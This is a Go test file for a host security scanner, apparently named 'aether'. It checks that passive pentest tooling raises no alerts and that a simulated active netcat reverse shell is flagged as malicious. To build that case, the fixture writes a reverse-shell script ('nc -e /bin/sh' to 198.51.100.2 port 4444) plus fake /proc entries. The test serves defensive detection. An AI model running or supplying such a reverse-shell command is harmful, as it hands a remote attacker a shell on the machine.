package realworld_test

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"testing"
	"time"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/ioc"
	"aether/internal/modules"
	"aether/internal/modules/network"
	"aether/internal/modules/process"
	"aether/internal/pkgdb"
	"aether/internal/report"
	"aether/internal/scanner"
)

func TestDualUseToolDiscrimination_Passive(t *testing.T) {
	profilesDir := findTestProfilesDir(t)
	pentestDir := filepath.Join(profilesDir, "workstation-pentest")

	_, findings, assessment, compliance := runProfileAudit(t, pentestDir)

	if !compliance.Compliant {
		t.Errorf("workstation-pentest failed compliance: %v", compliance.Violations)
	}

	if assessment.AlertsCount != 0 {
		t.Errorf("Expected 0 alerts for passive pentest tools, got %d", assessment.AlertsCount)
	}

	for _, f := range findings {
		if f.Severity == report.SeverityAlert || f.Verdict == report.VerdictMalicious {
			t.Errorf("Unexpected malicious finding on passive pentest tooling: %s (path: %s, rule: %s)",
				f.Title, f.Path, f.RuleName)
		}
	}
}

func TestDualUseToolDiscrimination_ActiveWeaponization(t *testing.T) {
	tempDir := t.TempDir()
	rootFS := filepath.Join(tempDir, "rootfs")
	procDir := filepath.Join(tempDir, "proc")
	if err := os.MkdirAll(rootFS, 0755); err != nil {
		t.Fatalf("MkdirAll rootfs: %v", err)
	}
	if err := os.MkdirAll(procDir, 0755); err != nil {
		t.Fatalf("MkdirAll proc: %v", err)
	}

	// 1. Package db owning nc
	dpkgDir := filepath.Join(rootFS, "var", "lib", "dpkg", "info")
	if err := os.MkdirAll(dpkgDir, 0755); err != nil {
		t.Fatalf("MkdirAll dpkg: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dpkgDir, "netcat.list"), []byte("/bin/nc\n"), 0644); err != nil {
		t.Fatalf("WriteFile netcat.list: %v", err)
	}

	// 2. Weaponized reverse shell script on disk
	scriptDir := filepath.Join(rootFS, "tmp")
	_ = os.MkdirAll(scriptDir, 0755)
	scriptPath := filepath.Join(scriptDir, "revshell.sh")
	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\nnc -e /bin/sh 198.51.100.2 4444\n"), 0755); err != nil {
		t.Fatalf("WriteFile revshell.sh: %v", err)
	}

	// 3. Active weaponized process executing the script
	pid := 9999
	pidDir := filepath.Join(procDir, fmt.Sprintf("%d", pid))
	if err := os.MkdirAll(pidDir, 0755); err != nil {
		t.Fatalf("MkdirAll pidDir: %v", err)
	}

	_ = os.WriteFile(filepath.Join(pidDir, "comm"), []byte("revshell.sh\n"), 0644)
	_ = os.WriteFile(filepath.Join(pidDir, "status"), []byte("Name:\trevshell.sh\nUid:\t1000\t1000\t1000\t1000\nGid:\t1000\t1000\t1000\t1000\nPPid:\t1\n"), 0644)
	_ = os.WriteFile(filepath.Join(pidDir, "stat"), []byte(fmt.Sprintf("%d (revshell.sh) S 1 9999 9999 0 -1 4194304 0 0 0 0 0 0 0 0 20 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n", pid)), 0644)

	// cmdline: /bin/sh /tmp/revshell.sh
	cmdlineArgs := []string{"/bin/sh", scriptPath}
	var cmdlineBytes []byte
	for _, a := range cmdlineArgs {
		cmdlineBytes = append(cmdlineBytes, []byte(a)...)
		cmdlineBytes = append(cmdlineBytes, 0)
	}
	_ = os.WriteFile(filepath.Join(pidDir, "cmdline"), cmdlineBytes, 0644)

	_ = os.Symlink(scriptPath, filepath.Join(pidDir, "exe"))
	_ = os.Symlink(scriptDir, filepath.Join(pidDir, "cwd"))
	_ = os.Symlink("mnt:[4026531840]", filepath.Join(pidDir, "ns", "mnt"))

	fdDir := filepath.Join(pidDir, "fd")
	_ = os.MkdirAll(fdDir, 0755)
	socketInode := uint64(88888)
	_ = os.Symlink(fmt.Sprintf("socket:[%d]", socketInode), filepath.Join(fdDir, "3"))

	_ = os.WriteFile(filepath.Join(pidDir, "maps"), []byte(fmt.Sprintf("00400000-00452000 r-xp 00000000 08:02 345678 %s\n", scriptPath)), 0644)

	// Network table: TCP connection to 198.51.100.2:4444 (198.51.100.2 = C6336402, 4444 = 115C)
	netDir := filepath.Join(procDir, "net")
	_ = os.MkdirAll(netDir, 0755)
	netTCP := fmt.Sprintf(`  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:9A5F 026433C6:115C 01 00000000:00000000 00:00000000 00000000  1000        0 %d 1 0000000083791369 100 0 0 10 0
`, socketInode)
	_ = os.WriteFile(filepath.Join(netDir, "tcp"), []byte(netTCP), 0644)

	// Run audit
	cfg := config.NewDefaultConfig()
	cfg.Scan.DemoRules = true
	cfg.Scan.Root = "/"
	cfg.Scan.Paths = []string{rootFS}
	cfg.Scan.ExplicitPaths = true

	bus := events.NewEventBus()
	defer bus.Close()
	rep, _ := report.NewConcurrentReporter("")
	defer rep.Close()
	bus.AttachReporter(rep)

	logger := slog.Default()
	iocEng, _ := ioc.NewEngine(cfg, logger)
	pkgDB := pkgdb.New(rootFS)

	procMod := process.NewModuleWithRoots(rootFS, procDir, iocEng, bus, logger)
	netMod := network.NewModuleWithRoots(rootFS, procDir, iocEng, bus, logger)

	sc := scanner.NewScanner(cfg, bus, rep, logger,
		scanner.WithPackageDB(pkgDB),
		scanner.WithModules([]modules.Module{procMod, netMod}),
	)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := sc.Run(ctx); err != nil {
		t.Fatalf("Scanner.Run: %v", err)
	}

	findings := rep.Findings()
	t.Logf("Observed %d findings on active weaponized nc shell", len(findings))

	foundAlert := false
	for _, f := range findings {
		t.Logf("  finding: rule=%s sev=%s verdict=%s path=%s reason=%s",
			f.RuleName, f.Severity, f.Verdict, f.Path, f.Reason)
		if f.Severity == report.SeverityAlert || f.Verdict == report.VerdictMalicious {
			foundAlert = true
		}
	}

	if !foundAlert {
		t.Errorf("Expected active weaponized nc shell to produce ALERT / MALICIOUS finding, but got none")
	}
}
